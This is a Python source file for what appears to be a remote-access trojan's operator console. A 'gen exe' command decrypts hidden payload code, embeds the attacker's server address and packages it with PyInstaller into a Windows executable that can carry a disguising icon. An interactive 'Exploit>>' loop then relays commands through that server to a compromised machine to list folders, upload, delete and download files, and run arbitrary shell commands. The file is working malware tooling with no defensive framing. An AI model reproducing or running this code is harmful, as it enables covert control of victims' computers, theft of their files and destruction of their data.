import requests,time, json, base64, ast, sys, os
import subprocess
from subprocess import PIPE
from enc120620 import *
g=True
headers = {"Content-Type": "application/json", "Accept": "*/*"}
animation = "|/—\\"
idx = 0
l=True
while True:
    os.system("cls")
    while True:
        gen = str(input("COMM>> "))
        if gen == 'gen exe':
            pathhh = sys.argv[0]
            pathsplit = pathhh.split("\\")
            generateexepath = ""
            acount = 0
            while acount < len(pathsplit)-1:
                generateexepath += pathsplit[acount]
                generateexepath += "\\"
                acount+=1
            mainpatha = generateexepath
            generateexepath += "generatedexefile"   
            name = str(input("EXE File Name>> "))
            icon = str(input("Icon (.ico) (NA if none)>> "))
            ipserver = str(input("Server IP>> "))
            ipport = str(input("Server PORT>> "))
            print("Please wait, file generating...")
            if name is not None or ipserver is not None or ipport is not None or name != '' or ipserver != '' or ipport != '':
                with open('DONOTDELETE.txt', 'r') as f:
                   src=f.readlines()
                with open('DONOTDELETE2.txt', 'r') as f:
                   src2=f.readlines()
                strings = ""
                strings2 = ""
                
                for items in src:
                    g=decrypt(items,'helloworld',int(3))+"\n"
                    strings+=g
                for items in src2:
                    g=decrypt(items,'helloworld',int(3))+"\n"
                    strings2+=g
                    
                itisthis = strings + f"ip = \"http://{ipserver}:\"\n"+f"port = \"{ipport}\"\n" + strings2
                print(generateexepath)
                with open(generateexepath+"\\"+name+".py", 'bx') as asd:
                    asd.write(itisthis.encode())
                print("Finishing....")
                gogo = None
                if icon == "NA":
                    gogo = subprocess.Popen("pyinstaller --noconfirm --onefile --console --name \""+name+"\" --clean \""+generateexepath+"\\"+name+".py\"", shell=True, stdout=PIPE)
                else:
                    gogo = subprocess.Popen("pyinstaller --noconfirm --onefile --console --name \""+name+"\" --icon \""+icon+"\" --clean \""+generateexepath+"\\"+name+".py\"", shell=True, stdout=PIPE)
                gogo.communicate()
                time.sleep(1)
                aso = subprocess.Popen("move "+mainpatha+"dist\\"+name+".exe "+mainpatha+"EXEFILES", shell=True, stdout=PIPE)
                aa= aso.communicate()[0]
                os.chdir(generateexepath)
                delw = subprocess.Popen("del /f "+name+".py", shell=True, stdout=PIPE)
                aa = delw.communicate()[0]
                os.chdir(mainpatha)
                delw = subprocess.Popen("del /f "+name+".spec", shell=True, stdout=PIPE)
                aa = delw.communicate()[0]
                print("Done!")
                os.system("pause")
                os.system("cls")
        elif gen == 'start':
            break
        elif gen == 'srvr strt':
            try:
                subprocess.call('start /MIN serv.exe', shell=True)
            except:
                try:
                    subprocess.call('start /MIN serv.exe', shell=True)
                except:
                    subprocess.call('start /MIN py main1.py', shell=True)
            continue
        elif gen == 'help':
            print("""
--------------------------------------------
|srvr strt  - start first before exploit   |
|start - start exploit                     |
|gen exe - generate exe file               |
-------------------------------------------- """)
            
        else:
            continue
    ip = str(input("Local IP>> "))
    port = str(input("Port>> "))
    try:
        if g and l:
            command = None
            chkk = True
            os.system("cls")
            while chkk:
                c = 0
                command = input("Exploit>> ")
                d = 'download' in command
            
                r = None
                if d:
                    command = command.split("--loc=")
                    command2 = command[1]
                    com = command[0]
                    bvil = {"d":str(com)}
                    r = requests.post('http://'+ip+':'+port+'/coms', data=json.dumps(bvil), headers=headers)
                else:
                    if 'help' != command:
                        bvil = {"d":str(command)}
                        requests.post('http://'+ip+':'+port+'/coms', data=json.dumps(bvil), headers=headers)
                time.sleep(1)
                a = 'cdir' in command
                b = 'dele' in command
                c = 'copy' in command
                
                if command == 'help':
                    print("""
----------------------------------------------------------
|cdir (.. - Back or / - Home or nextfolder)              |
|inside - look folder                                    |
|loc - check location                                    |
|copy - copy the file inside this folder to current      |
|       location of folder of a target  ex: copy exe.exe |
|dele - delete file                                      |
|download - download file                                |
|   ex: download exe.exe --loc=/home #MUST IN DIRECTORY  |
|exit -yes: exit exploit                                 |
|#YOU CAN TYPE ANY OTHER CMD COMMANDS                    |
----------------------------------------------------------""")
                elif command == "inside":
                    while True:
                        print("Loading "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if b'Done' in re2.content or "Done" in re2.text:
                            print("\n")
                            response = requests.get('http://'+ip+':'+port+'/ls')
                            val= str(response.content)
                            length = len(val)
                            if response.ok and response.content != "''":
                                if length != 0:
                                    val = val[1:]
                                    val = val.replace('"', "")
                                    val = val.replace("\\n", "\n")
                                    val = val.replace("\\r","\r")
                                    val = val.replace("\\\\", "/")
                                    print(val)
                                break
                            else:
                                break
                        elif "Failed" in re2.text:
                            print("\n"+re2.text)
                            break
                        time.sleep(0.5)
                elif a:
                    while True:
                        print("Loading "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if b'Done' in re2.content or "Done" in re2.text:
                            print("\n")
                            val= str(re2.text)
                            print(val)
                            break
                        elif "Failed" in re2.text:
                            print("\n"+re2.text)
                            break
                        time.sleep(0.5)
                elif command == 'loc':
                    while True:
                        print("Loading "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if b'Done' in re2.content or "Done" in re2.text:
                            print("\n")
                            response = requests.get('http://'+ip+':'+port+'/look')
                            val= str(response.content)
                            length = len(val)
                            if response.ok:
                                if length != 0:
                                    val = val[1:]
                                    val = val.replace('"', "")
                                    val = val.replace("\\n", "\n")
                                    val = val.replace("\\r","\r")
                                    val = val.replace("\\\\", "/")
                                    print(val)
                                break
                            else:
                                break
                        elif "Failed" in re2.text:
                            print("\n"+re2.text)
                            break
                        time.sleep(0.5)
                elif c:
                    while True:
                        print("Uploading "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if b'Done' in re2.content or "Done" in re2.text:
                            print("\n")
                            g=str(re2.text)
                            print(g)
                            break
                        elif "Failed" in re2.text:
                            print("\n"+re2.content)
                            break
                        time.sleep(0.5)
                elif b:
                    while True:
                        print("Deleting "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if b'Done' in re2.content or "Done" in re2.text:
                            print("\n")
                            g=str(re2.text)
                            print(g)
                            break
                        elif "Failed" in re2.text:
                            print("\n"+re2.content)
                            break
                        time.sleep(0.5)

                elif d:
                    if r.ok:
                        command = command[0].replace("download ","")
                        com = command.replace('"',"").replace('/','\\.../?').replace('\\','\\.../?').replace("\\\\","\\.../?").split('\\.../?')
                        while True:
                            print("Downloading "+ animation[idx % len(animation)], end="\r")
                            idx += 1
                            re2 = requests.get('http://'+ip+':'+port+'/msg')
                            print(re2.content);
                            if b'Done' in re2.content or "Done" in re2.text:
                                print("\n")
                                response = requests.get('http://'+ip+':'+port+'/download')
                                response2 = json.loads(response.content)
                                print('Done')
                                if response.ok:
                                    with open(command2+"\\"+com[len(com)-1], 'bx') as f:
                                        f.write(bytes(response2))
                                        print("Downloaded!")
                                    break
                                else:
                                    break
                            elif "Failed" in re2.text:
                                print("\nFailed")
                                break
                            time.sleep(0.5)
                elif 'exit' in command:
                    if 'exit -yes' == command:
                        chkk = False
                        break
                else:
                    while True:
                        print("Loading "+ animation[idx % len(animation)], end="\r")
                        idx += 1
                        re2 = requests.get('http://'+ip+':'+port+'/msg')
                        if len(re2.content)>0:
                            print("\n")
                            g = str(re2.text).replace("\\r","\r").replace("\\n","\n")
                            print(g)
                            break
                        elif "Failed" in re2.text:
                            print("\nFailed")
                            break
                        time.sleep(0.5)
                idx=0
            
    except Exception as a:
        print(a)

